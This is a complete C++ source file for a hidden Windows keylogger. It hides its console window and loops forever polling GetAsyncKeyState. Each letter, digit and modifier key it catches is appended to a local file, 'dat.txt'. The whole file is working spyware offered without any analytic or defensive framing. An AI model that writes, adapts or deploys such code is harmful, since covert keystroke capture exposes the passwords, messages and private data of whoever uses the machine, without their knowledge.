#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

void LOG(string input) {
	fstream LogFile;
	LogFile.open("dat.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


bool SpecialKeys(int S_Key) {
	switch (S_Key) {
    case 65:
    {
        int k=65;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 66:
    {
        int k=66;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 67:
    {
        int k=67;   
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 68:
    {
        int k=68;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 69:
    {
        int k=69;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 70:
    {
        int k=70;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 71:
    {
        int k=71;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 72:
    {
        int k=72;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 73:
    {
        int k=73;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 74:
    {
        int k=74;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 75:
    {
        int k=75;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 76:
    {
        int k=76;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 77:
    {
        int k=77;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 78:
    {
        int k=78;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 79:
    {
        int k=79;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 80:
    {
        int k=80;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 81:
    {
        int k=81;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 82:
    {
        int k=82;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 83:
    {
        int k=83;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 84:
    {
        int k=84;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 85:
    {
        int k=85;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 86:
    {
        int k=86;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    
    case 87:
    {
        int k=87;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 88:
    {
        int k=88;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 89:
    {
        int k=89;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 90:
    {
        int k=90;
        char c = (char)k;
        string s="";
        s+=c;
		cout <<c ;
		LOG(s);
		return true;
        break;
    }
    case 48:
    {  
		cout <<"0" ;
		LOG("0");
		return true;
        break;
    }
    case 49:
    {  
		cout <<"1" ;
		LOG("1");
		return true;
        break;
    }
    case 50:
    {  
		cout <<"2" ;
		LOG("2");
		return true;
        break;
    }
    case 51:
    {  
		cout <<"3" ;
		LOG("3");
		return true;
        break;
    }
    case 52:
    {  
		cout <<"4" ;
		LOG("4");
		return true;
        break;
    }
    case 53:
    {  
		cout <<"5" ;
		LOG("5");
		return true;
        break;
    }
    case 54:
    {  
		cout <<"6" ;
		LOG("6");
		return true;
        break;
    }
    case 55:
    {  
		cout <<"7" ;
		LOG("7");
		return true;
        break;
    }
    case 56:
    {  
		cout <<"8" ;
		LOG("8");
		return true;
        break;
    }
    case 57:
    {  
		cout <<"9" ;
		LOG("9");
		return true;
        break;
    }
    
	case VK_SPACE:
		cout << " ";
		LOG(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		LOG("\n");
		return true;
	case '.':
		cout << ".";
		LOG(".");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT^";
		LOG("#SHIFT^");
		return true;
	case VK_BACK:
		cout << "\b";
		LOG("\b");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		LOG("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		LOG("#CAPS_LCOK");
		return true;
	case VK_TAB:
		cout << "#TAB";
		LOG("#TAB");
		return true;
	case VK_UP:
		cout << "#UP";
		LOG("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		LOG("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		LOG("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		LOG("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:				
		cout << "#CONTROL";
		LOG("#CONTROL");
		return true;
	case VK_MENU:
		cout << "#ALT";
		LOG("#ALT");
		return true;
	default: 
		return false;
	}
}



int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';

	while (true) {
		// Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {

					fstream LogFile;
					LogFile.open("dat.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}
			}
		}
	}

	return 0;
}
